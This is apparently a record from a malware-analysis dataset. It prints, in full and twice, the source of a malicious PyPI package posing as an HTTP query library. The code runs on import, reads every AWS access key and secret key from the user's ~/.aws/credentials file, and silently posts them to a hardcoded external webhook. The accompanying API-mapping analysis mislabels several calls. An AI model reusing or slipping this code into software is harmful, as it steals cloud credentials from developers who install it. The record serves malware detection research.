[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/http_request_query-0.0.3/http_request_query-0.0.3/http_query/http_query.py",
    "code_snippet": "import os\nimport configparser\nimport requests\n\ndef push_secrets(web_hook):\n    config = configparser.RawConfigParser()\n    path = os.path.join(os.path.expanduser('~'), '.aws/credentials')\n    config.read(path)\n    \n    sections = config.sections()\n    all_secrets = []\n    for section in sections:\n        data_dict = {}\n        data_dict['section'] = section\n        data_dict['aws_access_key_id'] = config.get(section, 'aws_access_key_id')\n        data_dict['aws_secret_access_key'] = config.get(section, 'aws_secret_access_key')\n        all_secrets.append(data_dict)\n    headers = {'content-type': 'application/json'}\n    try:\n        requests.post(web_hook, json=all_secrets, headers=headers)\n    except requests.RequestException as e:\n        pass\n\nweb_hook = \"https://connect.pabbly.com/workflow/sendwebhookdata/IjU3NjUwNTY4MDYzMzA0MzQ1MjZiNTUzNzUxMzUi_pc\"\npush_secrets(web_hook)",
    "pattern_analysis": {
      "api_sequence": [
        "os.path.expanduser",
        "os.path.join",
        "configparser.RawConfigParser",
        "configparser.RawConfigParser.read",
        "configparser.RawConfigParser.sections",
        "configparser.RawConfigParser.get",
        "configparser.RawConfigParser.get",
        "requests.post"
      ],
      "api_sequence_with_args": [
        "os.path.expanduser('~')",
        "os.path.join(os.path.expanduser('~'), '.aws/credentials')",
        "configparser.RawConfigParser()",
        "config.read(path)",
        "config.sections()",
        "config.get(section, 'aws_access_key_id')",
        "config.get(section, 'aws_secret_access_key')",
        "requests.post(web_hook, json=all_secrets, headers=headers)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.path.expanduser",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "configparser.RawConfigParser",
          "id": "init_config_class",
          "description": "Initializes Config class with provided arguments",
          "first_id": "code_execution",
          "second_id": "object_initialization",
          "third_id": "class_initialization"
        },
        {
          "api_name": "configparser.RawConfigParser.read",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "configparser.RawConfigParser.sections",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "configparser.RawConfigParser.get",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "configparser.RawConfigParser.get",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        }
      ],
      "contextual_code": "import os\nimport configparser\nimport requests\n\ndef push_secrets(web_hook):\n    config = configparser.RawConfigParser()\n    path = os.path.join(os.path.expanduser('~'), '.aws/credentials')\n    config.read(path)\n    sections = config.sections()\n    all_secrets = []\n    for section in sections:\n        data_dict = {}\n        data_dict['section'] = section\n        data_dict['aws_access_key_id'] = config.get(section, 'aws_access_key_id')\n        data_dict['aws_secret_access_key'] = config.get(section, 'aws_secret_access_key')\n        all_secrets.append(data_dict)\n    headers = {'content-type': 'application/json'}\n    try:\n        requests.post(web_hook, json=all_secrets, headers=headers)\n    except requests.RequestException as e:\n        pass\n\nweb_hook = \"https://connect.pabbly.com/workflow/sendwebhookdata/IjU3NjUwNTY4MDYzMzA0MzQ1MjZiNTUzNzUxMzUi_pc\"\npush_secrets(web_hook)"
    }
  }
]